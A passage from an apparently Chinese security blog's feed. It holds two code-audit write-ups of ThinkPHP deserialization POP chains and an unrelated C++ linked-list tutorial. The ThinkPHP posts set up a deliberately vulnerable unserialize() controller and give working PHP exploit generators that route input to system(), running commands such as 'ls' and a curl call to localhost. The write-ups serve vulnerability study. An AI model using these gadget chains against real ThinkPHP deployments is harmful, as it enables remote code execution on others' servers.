alt="1570004296164"></p><p>这里直接跟进<code>updateData</code>方法,<code>$this-&gt;exists</code>可控置为<code>true</code>调用之. </p><p><img src="./1570011669208.png" srcset="/img/loading.gif" alt="1570011669208"></p><p>跟进<code>checkAlloFields</code>方法,<code>$table</code>变量三元表达式调用了字符串拼接且参数可控，可以调用<code>__toSring</code>方法.但是先得经过<code>$this-&gt;db()</code>调用。</p><p><img src="./1570011842895.png" srcset="/img/loading.gif" alt="1570011842895"></p><p>跟进db方法,可以发现这里也存在字符串拼接，$this-&gt;name 和 $this-&gt;suffix。就利用这里的方法调用<code>__toString</code></p><p><img src="./1570012061474.png" srcset="/img/loading.gif" alt="1570012061474"></p><p>首先得构造<code>$this-&gt;db</code> ，全局搜索包含<code>buildQuery</code>方法。定位到<code>Db</code>类，还需要构造传入的<code>$this-&gt;connection</code>参数不使得程序报错。</p><p><img src="./1570012188714.png" srcset="/img/loading.gif" alt="1570012188714"></p><p><code>$this-&gt;connection</code>需要满足</p><ol><li>数组</li><li><code>$config[&#39;type&#39;]</code></li><li><code>\think\db\connector0</code>命名空间,全局搜索结果只有<code>mysql</code>符合</li></ol><p><img src="./1570012804518.png" srcset="/img/loading.gif" alt="1570012804518"></p><p><img src="./1570012930448.png" srcset="/img/loading.gif" alt="1570012930448"></p><p>后面就开始进入字符串拼接，和thinkphp5.2相同就不在赘述</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">Db</span>&#123;    &#125;&#125;<span class="hljs-title">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span> &#123;    <span class="hljs-title">trait</span> <span class="hljs-title">Conversion</span>&#123;        <span class="hljs-title">protected</span> $<span class="hljs-title">visible</span>;    &#125;    <span class="hljs-keyword">trait</span> RelationShip&#123;        <span class="hljs-keyword">private</span> $relation;    &#125;    <span class="hljs-keyword">trait</span> Attribute&#123;        <span class="hljs-keyword">private</span> $withAttr;        <span class="hljs-keyword">private</span> $data;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;        <span class="hljs-title">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;        <span class="hljs-keyword">private</span> $lazySave;        <span class="hljs-keyword">private</span> $exists;        <span class="hljs-keyword">protected</span> $name;        <span class="hljs-keyword">protected</span> $db;        <span class="hljs-keyword">protected</span> $connection;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($data,$obj)</span></span><span class="hljs-function">        </span>&#123;                          <span class="hljs-keyword">$this</span>-&gt;lazySave=<span class="hljs-keyword">true</span>;            <span class="hljs-keyword">$this</span>-&gt;exists=<span class="hljs-keyword">true</span>;            <span class="hljs-keyword">$this</span>-&gt;data=$data;            <span class="hljs-keyword">$this</span>-&gt;db=$obj;            <span class="hljs-keyword">$this</span>-&gt;relation = [];            <span class="hljs-keyword">$this</span>-&gt;visible= [];            <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-keyword">$this</span>;            <span class="hljs-keyword">$this</span>-&gt;withAttr = <span class="hljs-keyword">array</span>(<span class="hljs-string">"paper"</span>=&gt;<span class="hljs-string">'system'</span>);            <span class="hljs-keyword">$this</span>-&gt;connection = [<span class="hljs-string">"type"</span>=&gt;<span class="hljs-string">"mysql"</span>];                    &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-title">extends</span> \<span class="hljs-title">think</span>\<span class="hljs-title">Model</span>&#123;        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>($<span class="hljs-title">data</span>,$<span class="hljs-title">obj</span>)        &#123;            <span class="hljs-title">parent</span>::<span class="hljs-title">__construct</span>($<span class="hljs-title">data</span>,$<span class="hljs-title">obj</span>);        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    $<span class="hljs-title">db</span> = <span class="hljs-title">new</span> <span class="hljs-title">think</span>\<span class="hljs-title">Db</span>();    $pivot2 = <span class="hljs-keyword">new</span> think\model\Pivot([<span class="hljs-string">'paper'</span>=&gt;<span class="hljs-string">'ls'</span>],$db);    <span class="hljs-keyword">echo</span> urlencode(serialize($pivot2));&#125;</code></pre><p><img src="./1570013139993.png" srcset="/img/loading.gif" alt="1570013139993"></p><h1 id="pop链条"><a href="#pop链条" class="headerlink" title="pop链条"></a>pop链条</h1><p>后半条和<strong>thinkphp 5.2</strong>相同不再赘述</p><p><img src="./bbb.png" srcset="/img/loading.gif" alt="bbb"></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP 5.2反序列化</title>
    <link href="/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>buuoj因为特殊原因暂时关闭了，没题刷了，那咋办嘛。最近thinkphp反序列化很火，遂补下落下的坑。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span>composer create-project topthink/think=5.2.x-dev v5.2<span class="hljs-comment"># 开启</span><span class="hljs-built_in">cd</span> /v5.2php think run</code></pre><p><strong>/app/controller/index.php</strong></p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controller</span>;</span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span></span><span class="php">&#123;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">($input=<span class="hljs-string">''</span>)</span></span></span><span class="php">    &#123;   </span><span class="php">        <span class="hljs-keyword">echo</span> $input;</span><span class="php">        unserialize($input);   </span><span class="php">    &#125;</span><span class="php">&#125;</span></code></pre><h1 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h1><p>反序列化入口于<code>class Windows::__destruct</code></p><p><img src="./1569945074405.png" srcset="/img/loading.gif" alt="1569945074405"></p><p><code>file_exists</code>可以触发<code>__toString</code>魔术方法,且这里<code>$this-&gt;files</code>可控</p><p><img src="./1569945085568.png" srcset="/img/loading.gif" alt="1569945085568"></p><p>全局搜<code>__toString</code>,跟进<code>conversion</code>类<code>toJson</code>方法</p><p><img src="./1569945170074.png" srcset="/img/loading.gif" alt="1569945170074"></p><p>跟进<code>toArray</code>方法，分析方法，需要考虑</p><ol><li>哪些是类变量调用的参数</li><li>有没有哪些类变量调用可以执行魔术方法当做跳板</li></ol><p>跟进<code>getAttr</code>方法，再跟进<code>getValue</code>方法。存在动态函数调用，我们去溯源下这几个参数</p><pre><code class="hljs php">$closure、$value、<span class="hljs-keyword">$this</span>-&gt;data</code></pre><p><img src="./1569945668458.png" srcset="/img/loading.gif" alt="1569945668458"></p><p>首先是<code>$value</code>参数，回到<code>Attribute</code>类<code>getAttr</code>方法，<code>$value</code>值由传入的<code>$name</code>决定且带入<code>getData</code>方法，<code>getRealFieldName</code>方法返回值又为<code>$name</code>值，接着带入<code>$this-&gt;data[$fileName]</code>。和data数组相关</p><p><img src="./1569946145939.png" srcset="/img/loading.gif" alt="1569946145939"></p><p>再往回看，这里<code>$key</code>值是<code>Conversion</code>类参数中<code>$this-&gt;data</code>和$<code>this-&gt;relation</code>键值可控。</p><p><img src="./1569946399566.png" srcset="/img/loading.gif" alt="1569946399566"></p><p>需要明白的是<code>Conversion</code>类是<code>trait</code>型，需要找到<code>use</code>它的类。定位到<code>model</code>类</p><p><img src="./1569946075634.png" srcset="/img/loading.gif" alt="1569946075634"></p><p><img src="./1569946085684.png" srcset="/img/loading.gif" alt="1569946085684"></p><p>modle构造方法中<code>$this-&gt;data</code>值是调用该该构造方法时候传入，由于是抽象类需要找到他的子类.</p><p>定位至Pivot类，这里构造方法调用了父类构造方法</p><p><img src="./1569946609630.png" srcset="/img/loading.gif" alt="1569946609630"></p><h2 id="closure参数"><a href="#closure参数" class="headerlink" title="$closure参数"></a>$closure参数</h2><p>至此漏洞点处的<code>$value</code>值已经分析完了，继续看漏洞点$closure参数。</p><p><code>withAttr</code>为类变量可控，继续跟进<code>$fieldName</code><br><img src="./1569946930286.png" srcset="/img/loading.gif" alt="1569946930286"></p><p>跟进<code>getRealFieldName</code>方法，传入参数为<code>$name</code>也是可控的。该值上面已经分析了为data数组键。</p><p>由于<code>$this-&gt;strict</code>为<code>true</code> 直接返回<code>$name</code>值</p><p>可以这样构造。</p><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;withAttr = <span class="hljs-keyword">array</span>(<span class="hljs-string">"paper"</span>=&gt;<span class="hljs-string">'system'</span>); =&gt; $closure=<span class="hljs-string">'system'</span>;</code></pre><p><img src="./1569947142956.png" srcset="/img/loading.gif" alt="1569947142956"></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>参考链接中利用了<a href="https://github.com/opis/closure" target="_blank" rel="noopener">\Opis\Closure</a>可用于序列化匿名函数</p><p>这里直接用system函数</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span> &#123;    <span class="hljs-title">class</span> <span class="hljs-title">Windows</span>&#123;        <span class="hljs-title">private</span> $<span class="hljs-title">files</span> = [];        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($files)</span></span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;files = $files;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span> &#123;    <span class="hljs-title">trait</span> <span class="hljs-title">Conversion</span>&#123;        <span class="hljs-title">protected</span> $<span class="hljs-title">visible</span>;    &#125;    <span class="hljs-keyword">trait</span> RelationShip&#123;        <span class="hljs-keyword">private</span> $relation;    &#125;    <span class="hljs-keyword">trait</span> Attribute&#123;        <span class="hljs-keyword">private</span> $withAttr;        <span class="hljs-keyword">private</span> $data;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span> &#123;    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;        <span class="hljs-title">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">RelationShip</span>;        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($closure)</span></span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;data = $closure;            <span class="hljs-keyword">$this</span>-&gt;relation = [];            <span class="hljs-keyword">$this</span>-&gt;visible= [];            <span class="hljs-keyword">$this</span>-&gt;withAttr = <span class="hljs-keyword">array</span>(<span class="hljs-string">"paper"</span>=&gt;<span class="hljs-string">'system'</span>);        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span> &#123;    <span class="hljs-title">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-title">extends</span> \<span class="hljs-title">think</span>\<span class="hljs-title">Model</span>&#123;        <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>($<span class="hljs-title">closure</span>)        &#123;            <span class="hljs-title">parent</span>::<span class="hljs-title">__construct</span>($<span class="hljs-title">closure</span>);        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    $pivot = new think\model\Pivot(['paper'=&gt;'curl http://127.0.0.1:8897']);    $windows = <span class="hljs-keyword">new</span> think\process\pipes\Windows([$pivot]);    <span class="hljs-keyword">echo</span> urlencode(serialize($windows));&#125;</code></pre><p><img src="./1569947445551.png" srcset="/img/loading.gif" alt="1569947445551"></p><h1 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h1><p><img src="./last.jpg" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/187332#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187332#h2-2</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 | 单链表增删改查</title>
    <link href="/2019/09/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%8D%95%E9%93%BE%E8%A1%A8%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
    <url>/2019/09/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%8D%95%E9%93%BE%E8%A1%A8%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h1><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STOP -999</span><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> Element;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lnode</span></span><span class="hljs-class">&#123;</span>    Element data;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lnode</span> *<span class="hljs-title">next</span>;</span>&#125;LNode;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">(LNode *L)</span></span>;<span class="hljs-function">LNode *<span class="hljs-title">create_list_H</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//(A)创建只有头结点head的: '空单链表'</span>    LNode *head,*p;    head = <span class="hljs-keyword">new</span> LNode;    head-&gt;next=<span class="hljs-literal">NULL</span>;    <span class="hljs-comment">//(B)录入链表各结点的数据, 并钩链</span>Element data;    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;        <span class="hljs-comment">//(a)键盘输入一个链表结点数据--&gt;data</span>        <span class="hljs-built_in">cin</span> &gt;&gt; data;        <span class="hljs-comment">//(b)若录入数据data == '数据录入'结束标志END_CODE,则完成链表创建！</span>        <span class="hljs-keyword">if</span> (data == STOP)        &#123;               <span class="hljs-keyword">break</span>;        &#125;        <span class="hljs-comment">//(c)录入的链表结点数据'data'有效, 则创建一个链表结点存储此数据</span>        p = <span class="hljs-keyword">new</span> LNode;        p-&gt;data=data;          <span class="hljs-comment">//(d)钩链: 新创建的结点q总是作为第一个结点</span>        p-&gt;next = head-&gt;next;        head-&gt;next=p;        <span class="hljs-comment">//(e)信息提示: 结点创建成功! 并显示当前链表的内容信息！！！</span>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"创建节点"</span> &lt;&lt; p-&gt;data &lt;&lt; <span class="hljs-string">"成功在表头"</span>;show(head);    &#125;    <span class="hljs-comment">//(C)返回此单链表的'头结点head'</span>    <span class="hljs-keyword">return</span> head;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">(LNode *L)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(L-&gt;next ==<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span>;&#125;LNode *p =L-&gt;next;<span class="hljs-keyword">while</span> (p!=<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"-&gt; "</span> &lt;&lt; p-&gt;data;p=p-&gt;next;&#125;<span class="hljs-built_in">cout</span> &lt;&lt;<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    LNode *head =  create_list_H();show(head);       <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;</code></pre><p>头插法逻辑</p><ol><li><p>创建一个空链表，需要维护住头指针、末尾指针指向空</p></li><li><p>创建新的LNode指针，传入需要插入的数据</p></li><li><p>钩链，为什么要钩链，钩链的目的是为了组成一个链式结构，相当于数组。总是以head头指针去钩住插入LNode类型数据便于维护和读取该链表。</p></li></ol><p>思考总结：头插法需要维护中head头指针</p><h1 id="尾插入法"><a href="#尾插入法" class="headerlink" title="尾插入法"></a>尾插入法</h1><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STOP -999</span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> element;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lnode</span></span><span class="hljs-class">&#123;</span>element data;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lnode</span> *<span class="hljs-title">next</span>;</span>&#125;LNode;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">(LNode *L)</span></span>;<span class="hljs-function">LNode *<span class="hljs-title">create_chain_e</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;LNode *head,*q,*p;<span class="hljs-comment">//初始化空链表，尾节点p指向head</span>head = p = <span class="hljs-keyword">new</span> LNode;head-&gt;next = <span class="hljs-literal">NULL</span>;element data;<span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<span class="hljs-built_in">cin</span> &gt;&gt; data;<span class="hljs-keyword">if</span> (data == STOP)&#123;<span class="hljs-keyword">break</span>;&#125;q= <span class="hljs-keyword">new</span> LNode;q-&gt;data = data;<span class="hljs-comment">//钩链：新创建的节点总是在尾部</span>q-&gt;next = p-&gt;next;p-&gt;next =q;p=q;<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"成功插入"</span> &lt;&lt; q-&gt;data &lt;&lt; <span class="hljs-string">"尾部"</span>;show(head);&#125;<span class="hljs-keyword">return</span> (head);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span> <span class="hljs-params">(LNode *L)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(L-&gt;next==<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span>;&#125;LNode *p=L-&gt;next;<span class="hljs-keyword">while</span> (p!=<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-comment">/* code */</span><span class="hljs-built_in">cout</span> &lt;&lt;  p-&gt;data &lt;&lt; <span class="hljs-string">"&lt;-"</span>;p=p-&gt;next;&#125;<span class="hljs-built_in">cout</span> &lt;&lt;<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;LNode *head = create_chain_e();show(head);<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;</code></pre><p>尾插入法逻辑</p><ol><li><p>新建三个指针分别是头指针、尾指针、插入指针</p></li><li><p>首先头指针head与尾指针p指向同一块内存地址</p></li><li><p>操作尾指针p与插入指针q地址，q-&gt;next=p-&gt;next使q连接null，p-&gt;next = q (左连接插入的指针)，p=q交换指针位置使p继续为尾节点(<strong>这样head指针就能指向插入的数据</strong>)</p><p>思考总结：这里体现了链表从右向左操作逻辑，还有需要注意的是head与p添加节点之前是指向同一块内存地址，这样相当于有固定头结点的功能。</p></li></ol><p><img src="./1569736296836.png" srcset="/img/loading.gif" alt="1569736296836"></p><h1 id="单链表查找"><a href="#单链表查找" class="headerlink" title="单链表查找"></a>单链表查找</h1><h2 id="按序号查找"><a href="#按序号查找" class="headerlink" title="按序号查找"></a>按序号查找</h2><pre><code class="hljs c++"><span class="hljs-function">element <span class="hljs-title">get_ElemByid</span><span class="hljs-params">(LNode *L, <span class="hljs-keyword">int</span> i)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-comment">//如果链表首节点或下一个节点位空，则判断该链表为空</span><span class="hljs-keyword">if</span> (L ==<span class="hljs-literal">NULL</span> &amp;&amp; L-&gt;next ==<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span> STOP;&#125;<span class="hljs-comment">//赋值定义p指向p下一个节点,因为首节点为null所以指向下一个</span>LNode *p = L-&gt;next;<span class="hljs-keyword">int</span> j =<span class="hljs-number">1</span>;<span class="hljs-keyword">while</span> (p!=<span class="hljs-literal">NULL</span> &amp;&amp; j&lt;i)&#123;p = p-&gt;next;j++;&#125;<span class="hljs-comment">//判断是否找到第i个节点</span><span class="hljs-keyword">if</span>(j!=i)<span class="hljs-comment">//i太大不给看</span>&#123;<span class="hljs-keyword">return</span> STOP;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> (p-&gt;data);&#125;&#125;</code></pre><p>按序号查找逻辑： 遍历指针指向第i的位置</p><p>需要注意需要查询是位于链表下一个元素当做首节点，</p><p><img src="./1569746509054.png" srcset="/img/loading.gif" alt="1569746509054"></p><h2 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h2><pre><code class="hljs c++"><span class="hljs-function">LNode *<span class="hljs-title">get_ElemByvalue</span><span class="hljs-params">(LNode *L,element i)</span></span><span class="hljs-function"></span>&#123;LNode *p = L-&gt;next;<span class="hljs-keyword">if</span> (L == <span class="hljs-literal">NULL</span> &amp;&amp; L-&gt;next == <span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">while</span> (p!=<span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;data !=i)&#123;p=p-&gt;next;&#125;<span class="hljs-keyword">if</span>(p != <span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span> p;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;&#125;</code></pre><p>按值查找逻辑：也是通过遍历指针，条件替换为值的比较。</p><p><img src="./1569746361295.png" srcset="/img/loading.gif" alt="1569746361295"></p><h1 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h1><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">insertElement</span><span class="hljs-params">(LNode *L,<span class="hljs-keyword">int</span> i,element data)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-comment">//定义p游标头，q插入的指针</span>LNode *p,*q;<span class="hljs-keyword">if</span> (L == <span class="hljs-literal">NULL</span> &amp;&amp; L-&gt;next ==<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;p=L;<span class="hljs-comment">//指向p头结点，可能会插到头节点位置</span><span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<span class="hljs-comment">// 防止超出链表长度,游标指向第i-1节点</span><span class="hljs-keyword">while</span> (p -&gt; next !=<span class="hljs-literal">NULL</span>&amp;&amp; j&lt;i<span class="hljs-number">-1</span>)&#123;p=p-&gt;next;j++;&#125;<span class="hljs-keyword">if</span> (j!=i<span class="hljs-number">-1</span>)&#123;<span class="hljs-comment">//i太大</span><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">else</span>&#123;q = <span class="hljs-keyword">new</span> LNode;q-&gt;data=data;q-&gt;next = p-&gt;next;p-&gt;next =q;<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;&#125;</code></pre><p>插入逻辑和注意点</p><ol><li><p>游标遍历时候需要注意是否会超出链表长度,以null判断</p></li><li><p>勾链操作类似新建链表</p></li><li><p>头结点head在组链表时候已经明确为空了，所以若插入在第一个节点，其实前面还有个值为null的节点。</p><p><img src="./1569746327282.png" srcset="/img/loading.gif" alt="1569746327282"></p></li></ol><h1 id="删"><a href="#删" class="headerlink" title="删"></a>删</h1><h2 id="删除指定位置的节点"><a href="#删除指定位置的节点" class="headerlink" title="删除指定位置的节点"></a>删除指定位置的节点</h2><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">deleteByid</span><span class="hljs-params">(LNode *L,<span class="hljs-keyword">int</span> i)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span> (L ==<span class="hljs-literal">NULL</span> &amp;&amp; L-&gt;next ==<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-comment">//q为游标，p为指向第i个待删除的节点</span>LNode *q,*p;q = L;p=L-&gt;next;<span class="hljs-keyword">int</span> j =<span class="hljs-number">0</span>;    <span class="hljs-comment">//p下一个节点不能为空，为空说明已经是在最后一个节点</span><span class="hljs-keyword">while</span> (p-&gt;next!=<span class="hljs-literal">NULL</span> &amp;&amp; j&lt;i<span class="hljs-number">-1</span>)&#123;<span class="hljs-comment">/* code */</span><span class="hljs-comment">//p与q指针交换位置,这样调整p指针也能够移动q</span>q=p;p=p-&gt;next;j++;&#125;<span class="hljs-keyword">if</span>(j!=i<span class="hljs-number">-1</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//直接钩住待删除第i个节点的下一个</span>q-&gt;next = p-&gt;next;<span class="hljs-comment">//删除p-&gt;next前继</span><span class="hljs-keyword">delete</span>(p);<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;&#125;</code></pre><p>思考总结：定义游标、待删指针。指针的移动可以通过地址迭代遍历，分别移动游标和待删指针</p><p><img src="./1569746264172.png" srcset="/img/loading.gif" alt="1569746264172"></p><h2 id="删除指定x第一个节点"><a href="#删除指定x第一个节点" class="headerlink" title="删除指定x第一个节点"></a>删除指定x第一个节点</h2><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">deleteByvar_1</span><span class="hljs-params">(LNode *L,element data)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span> (L == <span class="hljs-literal">NULL</span> &amp;&amp; L-&gt;next ==<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;LNode *q,*p;q=L;p=L-&gt;next;<span class="hljs-keyword">while</span> (p!=<span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;data != data)&#123;q=p;p=p-&gt;next;&#125;<span class="hljs-keyword">if</span>(p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;data == data)&#123;q-&gt;next = p-&gt;next;<span class="hljs-keyword">delete</span>(p);<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;&#125;</code></pre><p>思考总结：类比前面</p><p><img src="./1569746218114.png" srcset="/img/loading.gif" alt="1569746218114"></p><h2 id="删除链表中所有重复的节点x"><a href="#删除链表中所有重复的节点x" class="headerlink" title="删除链表中所有重复的节点x"></a>删除链表中所有重复的节点x</h2><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteByvar_n</span><span class="hljs-params">(LNode *L,element data)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(L==<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span>;&#125;LNode *q,*p;q=L;p=L-&gt;next;<span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">if</span>(p-&gt;data == data)&#123;q-&gt;next = p-&gt;next;<span class="hljs-keyword">delete</span>(p);p=q-&gt;next;<span class="hljs-comment">//待删除点继续跟在游标后</span>&#125;<span class="hljs-keyword">else</span>&#123;q=p;p = p-&gt;next;&#125;&#125;&#125;</code></pre><p>注意点：删除后，必须把待删节点继续接在游标后，否则p变量不存在,可能会随机分配p的值。</p><p><img src="./1569746195714.png" srcset="/img/loading.gif" alt="1569746195714"></p>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
